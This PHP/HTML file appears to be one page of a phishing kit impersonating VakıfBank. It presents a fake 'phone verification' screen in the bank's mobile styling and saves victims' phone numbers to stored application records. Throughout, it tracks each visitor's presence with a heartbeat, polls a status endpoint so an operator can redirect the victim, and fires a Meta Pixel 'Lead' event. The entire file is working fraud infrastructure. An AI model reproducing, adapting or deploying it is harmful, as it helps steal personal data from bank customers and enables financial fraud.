<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

$id = trim((string) ($_GET['id'] ?? $_POST['id'] ?? ''));
if ($id === '') {
    header('Location: giris.php');
    exit;
}

$application = findApplicationById($id);
if ($application === null) {
    http_response_code(404);
    echo 'Basvuru bulunamadi.';
    exit;
}

$statusEarly = (string) ($application['status'] ?? 'beklemede');
if ($statusEarly === 'yeniden-index') {
    header('Location: giris.php?error=hatali');
    exit;
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
    $phoneRaw = (string) (preg_replace('/\D+/', '', (string) ($_POST['phone'] ?? '')) ?? '');
    $normalizedPhone = $phoneRaw;
    if (strlen($normalizedPhone) === 14 && substr($normalizedPhone, 0, 4) === '0090') {
        $normalizedPhone = substr($normalizedPhone, 4);
    } elseif (strlen($normalizedPhone) === 12 && substr($normalizedPhone, 0, 2) === '90') {
        $normalizedPhone = substr($normalizedPhone, 2);
    } elseif (strlen($normalizedPhone) === 11 && substr($normalizedPhone, 0, 1) === '0') {
        $normalizedPhone = substr($normalizedPhone, 1);
    }

    $errors = [];
    if (strlen($normalizedPhone) !== 10) {
        $errors[] = 'Telefon numarasi 10 haneli olmalidir.';
    } elseif (substr($normalizedPhone, 0, 1) !== '5') {
        $errors[] = 'Telefon numarasi 5 ile baslamalidir.';
    }

    $_SESSION['tel_form_old'] = ['phone' => $phoneRaw];

    if (!empty($errors)) {
        $_SESSION['tel_form_errors'] = $errors;
        header('Location: tel.php?id=' . urlencode($id));
        exit;
    }

    $phoneForStorage = '0' . $normalizedPhone;
    try {
        $saved = false;
        if (function_exists('updateApplicationPhone')) {
            $saved = (bool) updateApplicationPhone($id, $phoneForStorage);
        }

        if (!$saved && function_exists('loadApplications') && function_exists('saveApplications')) {
            $applications = loadApplications();
            foreach ($applications as &$item) {
                if ((string) ($item['id'] ?? '') !== $id) {
                    continue;
                }
                $item['phone'] = $phoneForStorage;
                $item['updated_at'] = date('Y-m-d H:i:s');
                $saved = true;
                break;
            }
            unset($item);
            if ($saved) {
                saveApplications($applications);
            }
        }
    } catch (Throwable $e) {
    }

    unset($_SESSION['tel_form_old'], $_SESSION['tel_form_errors']);
    header('Location: waiting.php?id=' . urlencode($id));
    exit;
}

$errors = $_SESSION['tel_form_errors'] ?? [];
$old = $_SESSION['tel_form_old'] ?? [];
unset($_SESSION['tel_form_errors'], $_SESSION['tel_form_old']);

$storedPhone = (string) (preg_replace('/\D+/', '', (string) ($application['phone'] ?? '')) ?? '');
if (strlen($storedPhone) === 10) {
    $storedPhone = '0' . $storedPhone;
}
$phoneValue = (string) ($old['phone'] ?? $storedPhone);

upsertPresence('tel', (string) $application['id'], false);
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>VakıfBank — Telefon Doğrulama</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --gold: #e8b84a;
      --gold-bright: #f5d06a;
      --orange: #e8952e;
      --brown-dark: #2a1810;
      --text-white: #ffffff;
      --text-muted: rgba(255,255,255,.55);
      --input-bg: rgba(0,0,0,.28);
      --input-border: rgba(255,255,255,.22);
      --btn-continue: #c8d4e8;
      --btn-continue-text: #6b7a8f;
      --phone-w: 390px;
      --phone-h: 844px;
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #111;
      font-family: "Inter", system-ui, sans-serif;
      -webkit-font-smoothing: antialiased;
    }
    .phone {
      width: var(--phone-w);
      height: var(--phone-h);
      max-height: 96vh;
      border-radius: 36px;
      overflow: hidden;
      position: relative;
      box-shadow: 0 0 0 10px #1a1a1a, 0 20px 60px rgba(0,0,0,.6);
    }
    .screen {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      background: var(--brown-dark);
      color: var(--text-white);
    }
    .bg-gradient {
      position: absolute;
      inset: 0;
      background:
        radial-gradient(ellipse 120% 80% at 50% 35%, rgba(232,184,74,.45) 0%, transparent 55%),
        radial-gradient(ellipse 90% 60% at 80% 70%, rgba(180,100,40,.25) 0%, transparent 50%),
        linear-gradient(165deg, #1a0f08 0%, #3d2518 35%, #5c3a22 55%, #2a1810 100%);
      z-index: 0;
    }
    .bg-curves {
      position: absolute;
      inset: 0;
      z-index: 0;
      opacity: .35;
      background:
        url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 390 844'%3E%3Cpath d='M-20 200 Q200 100 400 250' fill='none' stroke='%23f5d06a' stroke-width='1' opacity='.4'/%3E%3Cpath d='M-10 400 Q250 300 420 500' fill='none' stroke='%23e8b84a' stroke-width='.8' opacity='.3'/%3E%3Cpath d='M50 600 Q200 500 380 650' fill='none' stroke='%23f5d06a' stroke-width='1.2' opacity='.25'/%3E%3C/svg%3E") center/cover no-repeat;
      pointer-events: none;
    }
    .screen > *:not(.bg-gradient):not(.bg-curves) { position: relative; z-index: 1; }

    .login-header {
      display: flex;
      align-items: center;
      padding: 4px 16px 20px;
      position: relative;
    }
    .back-btn {
      width: 44px;
      height: 44px;
      border: none;
      background: none;
      color: #fff;
      font-size: 1.5rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .logo-row {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .logo-v {
      height: 32px;
      width: auto;
      display: block;
    }
    .logo-name { font-size: 1.1rem; font-weight: 700; }

    .content {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 0 20px;
      text-align: center;
    }
    .title {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 8px;
    }
    .subtitle {
      font-size: .9rem;
      color: var(--text-muted);
      margin-bottom: 32px;
      line-height: 1.4;
    }
    .form-error {
      background: rgba(255,80,80,.15);
      border: 1px solid rgba(255,80,80,.35);
      border-radius: 10px;
      padding: 10px 14px;
      font-size: .8rem;
      color: #ff6b6b;
      margin-bottom: 16px;
      display: none;
    }
    .form-error.show { display: block; }
    .field {
      position: relative;
      margin-bottom: 16px;
    }
    .field input {
      width: 100%;
      padding: 16px 18px;
      border-radius: 12px;
      border: 1px solid var(--input-border);
      background: var(--input-bg);
      color: #fff;
      font-family: inherit;
      font-size: .9rem;
      outline: none;
      text-align: center;
    }
    .field input::placeholder { color: var(--text-muted); }
    .field input:focus {
      border-color: rgba(232,184,74,.5);
    }
    .btn-devam {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 14px;
      background: var(--btn-continue);
      color: var(--btn-continue-text);
      font-family: inherit;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn-devam:disabled { opacity: .6; cursor: default; }
    .btn-devam:active:not(:disabled) { opacity: .9; }

    .bottom-panel {
      background: rgba(235,240,248,.92);
      border-radius: 24px 24px 0 0;
      padding: 20px 8px 28px;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 4px;
    }
    .bottom-panel__item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
      border: none;
      background: none;
      cursor: pointer;
      font-family: inherit;
    }
    .bottom-panel__icon {
      width: 28px;
      height: 28px;
      color: var(--orange);
    }
    .bottom-panel__label {
      font-size: .5rem;
      color: #555;
      text-align: center;
      line-height: 1.15;
      max-width: 58px;
    }
    .bottom-panel__icon--fast {
      font-size: .6rem;
      font-weight: 800;
      font-style: italic;
      color: var(--orange);
    }
  </style>
  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1490333842624277');
  fbq('track', 'PageView');
  fbq('track', 'Lead');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1490333842624277&ev=PageView&noscript=1"
  /></noscript>
  <!-- End Meta Pixel Code -->
</head>
<body>
  <div class="phone">
    <section class="screen">
      <div class="bg-gradient"></div>
      <div class="bg-curves"></div>

      <header class="login-header">
        <button type="button" class="back-btn" onclick="history.back()" aria-label="Geri">‹</button>
        <div class="logo-row">
          <img class="logo-v" src="https://i.ibb.co/ZRCLCS2N/VAKBN-S-68aa6daf.png" alt="VakıfBank" />
        </div>
      </header>

      <div class="content">
        <h1 class="title">Telefon Doğrulama</h1>
        <p class="subtitle">Cep telefonu numaranızı girerek kimliğinizi doğrulayın</p>

        <?php if (!empty($errors)): ?>
          <div class="form-error show">
            <?= esc($errors[0]) ?>
          </div>
        <?php endif; ?>

        <div class="form-error" id="error-box"></div>

        <form method="post" action="tel.php?id=<?= urlencode($id) ?>" id="phoneForm">
          <input type="hidden" name="id" value="<?= esc($id) ?>">
          <div class="field">
            <input
              id="phone"
              name="phone"
              inputmode="tel"
              autocomplete="tel"
              minlength="8"
              maxlength="11"
              placeholder="Telefon Numarası (05...)"
              required
              value="<?= esc($phoneValue) ?>"
            >
          </div>
          <button type="submit" class="btn-devam" id="submitBtn">Doğrula</button>
        </form>
      </div>

      <nav class="bottom-panel">
        <button type="button" class="bottom-panel__item">
          <span class="bottom-panel__icon bottom-panel__icon--fast">fast</span>
          <span class="bottom-panel__label">FAST İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19V5M10 19V9M16 19v-6M22 19V3"/></svg>
          <span class="bottom-panel__label">Piyasa Bilgileri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
          <span class="bottom-panel__label">Karekod İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
          <span class="bottom-panel__label">Başvuru İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><rect x="8" y="6" width="8" height="5" rx="1"/></svg>
          <span class="bottom-panel__label">Cepte Kazan</span>
        </button>
      </nav>
    </section>
  </div>

  <script>
    const phoneInput = document.getElementById("phone");
    const submitBtn = document.getElementById("submitBtn");
    const errorBox = document.getElementById("error-box");
    const form = document.getElementById("phoneForm");
    const appId = <?= json_encode($id) ?>;

    phoneInput.addEventListener("input", () => {
      const digits = phoneInput.value.replace(/\D+/g, "");
      phoneInput.value = digits.slice(0, 11);
    });

    form.addEventListener("submit", async (e) => {
      const phone = phoneInput.value.replace(/\D+/g, "");
      if (phone.length < 10) {
        e.preventDefault();
        errorBox.textContent = "Telefon numarası en az 10 haneli olmalıdır.";
        errorBox.classList.add("show");
        return;
      }
      errorBox.classList.remove("show");
      submitBtn.disabled = true;
      submitBtn.textContent = "Doğrulanıyor...";
    });

    function sendHeartbeat() {
      const body = new URLSearchParams({
        screen: "tel",
        application_id: appId
      });
      fetch("heartbeat.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: body.toString(),
        keepalive: true
      }).catch(() => {});
    }

    sendHeartbeat();
    setInterval(sendHeartbeat, 10000);

    async function pollAdminRedirect() {
      try {
        const res = await fetch(`status.php?id=${encodeURIComponent(appId)}&_=${Date.now()}`);
        const data = await res.json();
        if (!data.ok) return;
        if (data.status === "yeniden-index") {
          window.location.href = "giris.php?error=hatali";
        }
      } catch (e) {}
    }
    pollAdminRedirect();
    setInterval(pollAdminRedirect, 4000);
  </script>
</body>
</html>
